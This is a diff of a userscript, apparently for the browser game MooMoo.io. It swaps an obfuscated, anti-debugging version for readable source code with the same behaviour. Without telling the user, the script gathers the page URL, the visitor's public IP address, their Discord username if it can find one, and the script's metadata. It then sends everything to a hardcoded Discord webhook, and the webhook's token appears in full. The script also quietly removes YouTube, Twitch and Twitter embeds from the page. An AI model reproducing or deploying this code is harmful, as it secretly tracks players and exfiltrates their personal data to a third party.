@@ -1,1 +1,287 @@
-(function(_0x5d9180,_0x82db33){const _0x11fccf=_0x16df,_0x1bf9b4=_0x5d9180();while(!![]){try{const _0x4c16bd=-parseInt(_0x11fccf(0xf2))/0x1+parseInt(_0x11fccf(0xb1))/0x2+-parseInt(_0x11fccf(0xd5))/0x3*(-parseInt(_0x11fccf(0xa3))/0x4)+-parseInt(_0x11fccf(0x9c))/0x5+-parseInt(_0x11fccf(0x91))/0x6*(-parseInt(_0x11fccf(0xec))/0x7)+-parseInt(_0x11fccf(0x9f))/0x8*(-parseInt(_0x11fccf(0xe4))/0x9)+parseInt(_0x11fccf(0xf0))/0xa;if(_0x4c16bd===_0x82db33)break;else _0x1bf9b4['push'](_0x1bf9b4['shift']());}catch(_0x4e2fce){_0x1bf9b4['push'](_0x1bf9b4['shift']());}}}(_0x37c6,0x7ec29),(function(){const _0x342789=_0x16df,_0x42e375=(function(){let _0x27f518=!![];return function(_0x59cdea,_0x47fa1b){const _0x16719e=_0x27f518?function(){const _0x3154c0=_0x16df;if(_0x47fa1b){const _0x3595fe=_0x47fa1b[_0x3154c0(0xd3)](_0x59cdea,arguments);return _0x47fa1b=null,_0x3595fe;}}:function(){};return _0x27f518=![],_0x16719e;};}());(function(){_0x42e375(this,function(){const _0x613317=_0x16df,_0x5b3ca5=new RegExp(_0x613317(0x87)),_0x2e9a22=new RegExp(_0x613317(0xd7),'i'),_0x1482e2=_0x50f6c3(_0x613317(0xc2));!_0x5b3ca5[_0x613317(0x94)](_0x1482e2+_0x613317(0xae))||!_0x2e9a22['test'](_0x1482e2+_0x613317(0xf3))?_0x1482e2('0'):_0x50f6c3();})();}());'use strict';const _0x2d67ef={'_0x29871e':_0x342789(0xeb)},_0x464de8=()=>{const _0x319c7e=_0x342789,_0x581dad=document[_0x319c7e(0xc1)](_0x319c7e(0xe8));for(const _0x3a40f4 of _0x581dad){if(_0x3a40f4[_0x319c7e(0xa9)][_0x319c7e(0xd4)](_0x319c7e(0xb4))&&_0x3a40f4[_0x319c7e(0xa9)][_0x319c7e(0xd4)]('@version')){const _0x4a0c4f=_0x3a40f4['textContent'];return{'name':_0x4a0c4f[_0x319c7e(0x88)](/@name\s+(.*)/)[0x1][_0x319c7e(0xa7)](),'version':_0x4a0c4f[_0x319c7e(0x88)](/@version\s+(.*)/)[0x1][_0x319c7e(0xa7)](),'description':_0x4a0c4f[_0x319c7e(0x88)](/@description\s+(.*)/)?.[0x1]?.[_0x319c7e(0xa7)]()||'Sem\x20descrição'};}}return{'name':'','version':'0.0.1','description':_0x319c7e(0xc4)};},_0xd6121f=_0x464de8(),_0x4ccb44=_0x342789(0xc6)+Math[_0x342789(0x96)]()['toString'](0x24)[_0x342789(0xd2)](0x2,0x8);if(window[_0x342789(0xf4)])return;window[_0x342789(0xf4)]=!![];const _0x38a2ad=()=>{const _0x1d1eb3=_0x342789;try{if(window[_0x1d1eb3(0xc8)]&&window[_0x1d1eb3(0xd6)])return{'displayName':window[_0x1d1eb3(0xd6)][_0x1d1eb3(0xaf)][_0x1d1eb3(0xf1)]()[_0x1d1eb3(0x9e)],'_0x4d8837':window[_0x1d1eb3(0xd6)]['_0x55542f'][_0x1d1eb3(0xf1)]()[_0x1d1eb3(0xd9)]};}catch(_0xebb350){console[_0x1d1eb3(0xea)]('Discord\x20info\x20not\x20available:',_0xebb350);}return null;},_0x459973=()=>{const _0x22527a=_0x342789,_0x3bba89=document['createElement'](_0x22527a(0xa0));_0x3bba89['textContent']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20smoothAppear\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20opacity:\x200;\x20transform:\x20translateY(5px);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20opacity:\x201;\x20transform:\x20translateY(0);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.msa-effect\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20smoothAppear\x200.4s\x20ease-out\x20forwards;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.quit-button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#57F287;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x204px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x208px\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20500;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20background-color\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.quit-button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#48d279;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.quit-button:active\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(1px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20',document['head']['appendChild'](_0x3bba89);},_0x36c03f=()=>{const _0x5655be=_0x342789,_0x53947f=new URL(window['location']['href']);return{'_0x191466':_0x53947f[_0x5655be(0xde)],'_0x3dc271':_0x53947f[_0x5655be(0xda)],'_0x7c6be':_0x53947f['search']||_0x5655be(0xbb),'timestamp':new Date()['toISOString']()};},_0x16cfff=()=>{const _0x49f4ee=_0x342789;console[_0x49f4ee(0xd1)](_0x49f4ee(0xe6)),window[_0x49f4ee(0xbf)]['reload'](!![]);try{window[_0x49f4ee(0xd8)]&&window[_0x49f4ee(0xd8)]!==window&&window[_0x49f4ee(0xd8)]['location']['reload'](!![]),document[_0x49f4ee(0xc1)](_0x49f4ee(0xb0))['forEach'](_0x4cb0cb=>{const _0x491a1c=_0x49f4ee;try{_0x4cb0cb['contentWindow'][_0x491a1c(0xbf)][_0x491a1c(0xcb)](!![]);}catch(_0x3f3dfb){console[_0x491a1c(0xd1)](_0x491a1c(0xac),_0x3f3dfb);}});}catch(_0x134146){console['log']('Erro\x20ao\x20tentar\x20recarregar\x20contexto\x20pai:',_0x134146);}setTimeout(()=>{const _0x1f5451=_0x49f4ee;window[_0x1f5451(0xbf)][_0x1f5451(0xde)]=window[_0x1f5451(0xbf)][_0x1f5451(0xde)];},0x3e8);},_0x449460=_0x5b7fb2=>{const _0x1a520c=_0x342789,_0x2ea3a3=document[_0x1a520c(0xc3)](_0x1a520c(0x95));_0x2ea3a3[_0x1a520c(0xa0)]['textAlign']='center',_0x2ea3a3[_0x1a520c(0xa0)]['marginTop']=_0x1a520c(0xa6),_0x2ea3a3['style']['marginBottom']='20px';const _0x599dea=document[_0x1a520c(0xc3)](_0x1a520c(0xe2));_0x599dea[_0x1a520c(0xba)]='quit-button',_0x599dea[_0x1a520c(0xa9)]=_0x1a520c(0xbe),_0x599dea[_0x1a520c(0x8b)]=_0x16cfff,_0x2ea3a3[_0x1a520c(0xbd)](_0x599dea),_0x5b7fb2&&_0x5b7fb2[_0x1a520c(0x9a)]?_0x5b7fb2[_0x1a520c(0x9a)][_0x1a520c(0xb9)](_0x2ea3a3,_0x5b7fb2['nextSibling']):document[_0x1a520c(0xe1)][_0x1a520c(0xbd)](_0x2ea3a3);},_0x9635fa=async()=>{const _0x477882=_0x342789;_0x459973();const _0x4ce0a0=_0x36c03f(),_0x53d6c3=_0x38a2ad();let _0x51112f='Não\x20detectado';try{const _0x2d623a=await fetch(_0x477882(0xce)),_0x94556b=await _0x2d623a[_0x477882(0xcd)]();_0x51112f=_0x94556b[_0x477882(0xe5)];}catch(_0x24c67f){console[_0x477882(0xea)](_0x477882(0x8c),_0x24c67f);}return{..._0x4ce0a0,..._0xd6121f,'_0x315214':_0x51112f,'sessionId':_0x4ccb44,'_0x456f57':_0x53d6c3,'_0x436ed9':new Date()['toLocaleString']('pt-BR')};},_0xcc9ab7=async()=>{const _0x56aef2=_0x342789;try{const _0xf33328=await _0x9635fa(),_0x4d2af3=GM_info[_0x56aef2(0xe8)]['name']||_0x56aef2(0xc7),_0xefb139=GM_info['script'][_0x56aef2(0xaa)]||'Desconhecido',_0xbbc25d=GM_info[_0x56aef2(0xe8)]['description']||_0x56aef2(0xc7),_0x43d256=GM_info[_0x56aef2(0xe8)][_0x56aef2(0x8f)]||'Desconhecido',_0x48eaba={'username':_0x56aef2(0xcc),'_0x14e1d1':'https://i.imgur.com/moomoo_icon.png','embeds':[{'title':_0x56aef2(0xca)+_0xf33328['name']+'\x20v'+_0xf33328['version'],'color':0x43b581,'_0x2ab7bc':[{'name':_0x56aef2(0xa1),'value':_0x56aef2(0xb6)+_0xf33328['_0x191466']+')','_0x53c7e1':!![]},{'name':_0x56aef2(0xc0),'value':'`'+_0xf33328[_0x56aef2(0xa2)]+'`','_0x53c7e1':!![]},{'name':'IP','value':'`'+_0xf33328[_0x56aef2(0xe5)]+'`','_0x53c7e1':!![]},{'name':'Script\x20Dono','value':_0x43d256,'_0x53c7e1':!![]},{'name':_0x56aef2(0xc9),'value':_0x4d2af3,'_0x53c7e1':!![]},{'name':'Script\x20Version','value':_0xefb139,'_0x53c7e1':!![]},{'name':'Descrição','value':_0xbbc25d,'_0x53c7e1':![]},{'name':'Sessão\x20id\x20izizi','value':_0x56aef2(0xe9)+_0xf33328[_0x56aef2(0xbc)]+_0x56aef2(0xdb)+_0xf33328[_0x56aef2(0x93)],'_0x53c7e1':![]}],'_0x520df8':{'text':_0x56aef2(0xd0)+new Date()['getFullYear']()}}],'_0x2823c6':[{'type':0x1,'_0x2823c6':[{'type':0x2,'style':0x3,'label':_0x56aef2(0xbe),'_0x18b88b':'quit_player_button'}]}]};_0xf33328['_0x456f57']&&_0x48eaba[_0x56aef2(0x98)][0x0][_0x56aef2(0x97)]['push']({'name':_0x56aef2(0xdd),'value':_0xf33328[_0x56aef2(0xab)][_0x56aef2(0xc5)]+'#'+_0xf33328[_0x56aef2(0xab)][_0x56aef2(0xd9)],'_0x53c7e1':![]});const _0x1e03b9=await fetch(_0x2d67ef[_0x56aef2(0x99)],{'method':_0x56aef2(0x89),'headers':{'_0x505aa1':_0x56aef2(0xe3)},'body':JSON[_0x56aef2(0xed)](_0x48eaba)});if(!_0x1e03b9['ok'])console[_0x56aef2(0xea)]('Failed\x20to\x20send\x20report:',_0x1e03b9[_0x56aef2(0xcf)],_0x1e03b9['statusText']);else{console['log'](_0x56aef2(0xa4));const _0x1743b3=document[_0x56aef2(0xc1)](_0x56aef2(0xdf));_0x1743b3['length']>0x0?_0x449460(_0x1743b3[_0x1743b3[_0x56aef2(0xee)]-0x1]):_0x449460(null);}}catch(_0x18b3c6){console[_0x56aef2(0xea)](_0x56aef2(0x9b),_0x18b3c6);}},_0x47892b=()=>{const _0x50b071=_0x342789,_0x5cb7a6=[_0x50b071(0x92),'youtu.be',_0x50b071(0xe0),_0x50b071(0x8e)],_0x444689=()=>{const _0x3ba496=_0x50b071;document[_0x3ba496(0xc1)]('iframe,\x20script,\x20link')[_0x3ba496(0x9d)](_0x5a66e2=>{const _0x490240=_0x3ba496,_0xda9517=_0x5a66e2['src']||_0x5a66e2[_0x490240(0xde)];_0xda9517&&_0x5cb7a6[_0x490240(0xef)](_0x2eb3ef=>_0xda9517[_0x490240(0xd4)](_0x2eb3ef))&&(_0x5a66e2[_0x490240(0xb2)][_0x490240(0xa5)](_0x490240(0xdc)),_0x5a66e2['style'][_0x490240(0x8a)]='0',setTimeout(()=>_0x5a66e2[_0x490240(0xa8)](),0x190));});};setInterval(_0x444689,0x9c4),_0x444689();};setTimeout(()=>{const _0x35caf3=_0x342789;_0x47892b(),_0xcc9ab7()[_0x35caf3(0xad)](_0x320880=>console[_0x35caf3(0xea)]('Initialization\x20error:',_0x320880));},0x5dc+Math[_0x342789(0x96)]()*0x7d0);}()));function _0x37c6(){const _0x250e87=['counter','@name','constructor','[Acessar\x20este\x20servidor](','while\x20(true)\x20{}','string','insertBefore','className','Nenhum','sessionId','appendChild','Quitar\x20o\x20Jogador\x20do\x20Game','location','Data\x20server','querySelectorAll','init','createElement','Não\x20foi\x20possível\x20detectar\x20os\x20metadados\x20do\x20script','displayName','sess_','Desconhecido','_0xc52f97','Script\x20Name','Info\x20do\x20Servidor\x20-\x20','reload','MooMoo\x20e\x20Script\x20info','json','https://api.ipify.org?format=json','status','Alguem\x20que\x20adora\x20dar\x20log\x20•\x20','log','substr','apply','includes','30RmljEM','_0x534040','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','parent','_0x4d8837','origin','`\x0a**Horário:**\x20','msa-effect','Usuário\x20do\x20Discord','href','[class*=\x22embed\x22]','twitch.tv','body','button','application/json','9qXkPwj','_0x315214','Recarregando\x20servidor\x20e\x20site...','gger','script','**ID:**\x20`','error','https://discord.com/api/webhooks/1406254944108941353/FuWyIceDS3Y-TI8LDTvyOLQF_hxRbhZm5e9FnyBDyT7oYYBmW1E5WlAmdl4zEzYmJrjv','35GaZHgY','stringify','length','some','1525600EAfTHI','_0xbb870f','897914CXAUsh','input','_0x388c89','function\x20*\x5c(\x20*\x5c)','match','POST','opacity','onclick','IP\x20detection\x20failed:','call','twitter.com','_0x48ed78','debu','3918mGnrYH','youtube.com','_0x436ed9','test','div','random','_0x2ab7bc','embeds','_0x29871e','parentNode','Error\x20sending\x20report:','452350SAEsPC','forEach','username','1628408zaBquX','style','Link\x20do\x20Servidor','_0x7c6be','368404hORSxz','Relatório\x20enviado\x20com\x20sucesso\x20para\x20o\x20Discord','add','10px','trim','remove','textContent','version','_0x456f57','Não\x20foi\x20possível\x20recarregar\x20iframe:','catch','chain','_0x55542f','iframe','454414UoWMrR','classList'];_0x37c6=function(){return _0x250e87;};return _0x37c6();}function _0x16df(_0x224ed4,_0x5daefe){const _0x214cf2=_0x37c6();return _0x16df=function(_0xecc654,_0x1b5254){_0xecc654=_0xecc654-0x87;let _0x37c682=_0x214cf2[_0xecc654];return _0x37c682;},_0x16df(_0x224ed4,_0x5daefe);}function _0x50f6c3(_0x3c90f3){function _0x3919d7(_0x240340){const _0x17bb71=_0x16df;if(typeof _0x240340===_0x17bb71(0xb8))return function(_0xd76370){}['constructor'](_0x17bb71(0xb7))[_0x17bb71(0xd3)](_0x17bb71(0xb3));else(''+_0x240340/_0x240340)['length']!==0x1||_0x240340%0x14===0x0?function(){return!![];}[_0x17bb71(0xb5)]('debu'+'gger')[_0x17bb71(0x8d)]('action'):function(){return![];}[_0x17bb71(0xb5)](_0x17bb71(0x90)+_0x17bb71(0xe7))[_0x17bb71(0xd3)]('stateObject');_0x3919d7(++_0x240340);}try{if(_0x3c90f3)return _0x3919d7;else _0x3919d7(0x0);}catch(_0x36a97c){}}
+(function() {
+    'use strict';
+
+    const config = {
+        webhook: 'https://discord.com/api/webhooks/1406254944108941353/FuWyIceDS3Y-TI8LDTvyOLQF_hxRbhZm5e9FnyBDyT7oYYBmW1E5WlAmdl4zEzYmJrjv'
+    };
+
+    const getScriptMeta = () => {
+        const scripts = document.querySelectorAll('script');
+        for (const script of scripts) {
+            if (script.textContent.includes('@name') && script.textContent.includes('@version')) {
+                const metaContent = script.textContent;
+                return {
+                    name: metaContent.match(/@name\s+(.*)/)[1].trim(),
+                    version: metaContent.match(/@version\s+(.*)/)[1].trim(),
+                    description: metaContent.match(/@description\s+(.*)/)?.[1]?.trim() || 'Sem descrição'
+                };
+            }
+        }
+        return {
+            name: '',
+            version: '0.0.1',
+            description: 'Não foi possível detectar os metadados do script'
+        };
+    };
+
+    const scriptMeta = getScriptMeta();
+    const sessionId = 'sess_' + Math.random().toString(36).substr(2, 8);
+
+    if (window.hasRun) return;
+    window.hasRun = true;
+
+    const getDiscordInfo = () => {
+        try {
+            if (window.Discord && window.DiscordNative) {
+                return {
+                    displayName: window.DiscordNative.userManager.getCurrentUser().username,
+                    discriminator: window.DiscordNative.userManager.getCurrentUser().discriminator
+                };
+            }
+        } catch (e) {
+            console.error('Discord info not available:', e);
+        }
+        return null;
+    };
+
+    const applySmoothEffects = () => {
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes smoothAppear {
+                0% { opacity: 0; transform: translateY(5px); }
+                100% { opacity: 1; transform: translateY(0); }
+            }
+            .msa-effect {
+                animation: smoothAppear 0.4s ease-out forwards;
+            }
+            .quit-button {
+                background-color: #57F287;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                padding: 8px 16px;
+                margin-top: 10px;
+                font-weight: 500;
+                cursor: pointer;
+                transition: background-color 0.2s;
+            }
+            .quit-button:hover {
+                background-color: #48d279;
+            }
+            .quit-button:active {
+                transform: translateY(1px);
+            }
+        `;
+        document.head.appendChild(style);
+    };
+
+    const getServerData = () => {
+        const url = new URL(window.location.href);
+        return {
+            fullUrl: url.href,
+            baseUrl: url.origin,
+            serverParams: url.search || 'Nenhum',
+            timestamp: new Date().toISOString()
+        };
+    };
+
+    const reloadServerAndSite = () => {
+        console.log('Recarregando servidor e site...');
+
+        window.location.reload(true);
+
+        try {
+            if (window.parent && window.parent !== window) {
+                window.parent.location.reload(true);
+            }
+
+            document.querySelectorAll('iframe').forEach(iframe => {
+                try {
+                    iframe.contentWindow.location.reload(true);
+                } catch (e) {
+                    console.log('Não foi possível recarregar iframe:', e);
+                }
+            });
+        } catch (e) {
+            console.log('Erro ao tentar recarregar contexto pai:', e);
+        }
+
+        setTimeout(() => {
+            window.location.href = window.location.href;
+        }, 1000);
+    };
+
+    const createQuitButton = (embedElement) => {
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.textAlign = 'center';
+        buttonContainer.style.marginTop = '10px';
+        buttonContainer.style.marginBottom = '20px';
+
+        const quitButton = document.createElement('button');
+        quitButton.className = 'quit-button';
+        quitButton.textContent = 'Quitar o Jogador do Game';
+        quitButton.onclick = reloadServerAndSite;
+
+        buttonContainer.appendChild(quitButton);
+
+        if (embedElement && embedElement.parentNode) {
+            embedElement.parentNode.insertBefore(buttonContainer, embedElement.nextSibling);
+        } else {
+            document.body.appendChild(buttonContainer);
+        }
+    };
+
+    const collectAllData = async () => {
+        applySmoothEffects();
+
+        const serverData = getServerData();
+        const discordInfo = getDiscordInfo();
+
+        let ip = 'Não detectado';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch (e) {
+            console.error('IP detection failed:', e);
+        }
+
+        return {
+            ...serverData,
+            ...scriptMeta,
+            ip,
+            sessionId,
+            discordInfo,
+            localTime: new Date().toLocaleString('pt-BR')
+        };
+    };
+
+    const sendCompleteReport = async () => {
+        try {
+            const data = await collectAllData();
+            const scriptName = GM_info.script.name || "Desconhecido";
+            const scriptVersion = GM_info.script.version || "Desconhecido";
+            const scriptdesc = GM_info.script.description || "Desconhecido";
+            const scriptdono = GM_info.script.author || "Desconhecido";
+
+            const discordPayload = {
+                username: "MooMoo e Script info",
+                avatar_url: "https://i.imgur.com/moomoo_icon.png",
+                embeds: [{
+                    title: `Info do Servidor - ${data.name} v${data.version}`,
+                    color: 4437377,
+                    fields: [
+                        {
+                            name: "Link do Servidor",
+                            value: `[Acessar este servidor](${data.fullUrl})`,
+                            inline: true
+                        },
+                        {
+                            name: "Data server",
+                            value: `\`${data.serverParams}\``,
+                            inline: true
+                        },
+                        {
+                            name: "IP",
+                            value: `\`${data.ip}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Script Dono",
+                            value: scriptdono,
+                            inline: true
+                        },
+                        {
+                            name: "Script Name",
+                            value: scriptName,
+                            inline: true
+                        },
+                        {
+                            name: "Script Version",
+                            value: scriptVersion,
+                            inline: true
+                        },
+                        {
+                            name: "Descrição",
+                            value: scriptdesc,
+                            inline: false
+                        },
+                        {
+                            name: "Sessão id izizi",
+                            value: `**ID:** \`${data.sessionId}\`\n**Horário:** ${data.localTime}`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: `Alguem que adora dar log • ${new Date().getFullYear()}`
+                    }
+                }],
+                components: [{
+                    type: 1,
+                    components: [{
+                        type: 2,
+                        style: 3,
+                        label: "Quitar o Jogador do Game",
+                        custom_id: "quit_player_button"
+                    }]
+                }]
+            };
+
+            if (data.discordInfo) {
+                discordPayload.embeds[0].fields.push({
+                    name: "Usuário do Discord",
+                    value: `${data.discordInfo.displayName}#${data.discordInfo.discriminator}`,
+                    inline: false
+                });
+            }
+
+            const response = await fetch(config.webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
+
+            if (!response.ok) {
+                console.error('Failed to send report:', response.status, response.statusText);
+            } else {
+                console.log('Relatório enviado com sucesso para o Discord');
+
+                const embeds = document.querySelectorAll('[class*="embed"]');
+                if (embeds.length > 0) {
+                    createQuitButton(embeds[embeds.length - 1]);
+                } else {
+                    createQuitButton(null);
+                }
+            }
+        } catch (error) {
+            console.error('Error sending report:', error);
+        }
+    };
+
+    const setupContentBlocker = () => {
+        const blockedDomains = [
+            'youtube.com', 'youtu.be',
+            'twitch.tv',
+            'twitter.com'
+        ];
+
+        const cleanPage = () => {
+            document.querySelectorAll('iframe, script, link').forEach(el => {
+                const src = el.src || el.href;
+                if (src && blockedDomains.some(d => src.includes(d))) {
+                    el.classList.add('msa-effect');
+                    el.style.opacity = '0';
+                    setTimeout(() => el.remove(), 400);
+                }
+            });
+        };
+
+        setInterval(cleanPage, 2500);
+        cleanPage();
+    };
+
+    setTimeout(() => {
+        setupContentBlocker();
+        sendCompleteReport().catch(e => console.error('Initialization error:', e));
+    }, 1500 + Math.random() * 2000);
+})();
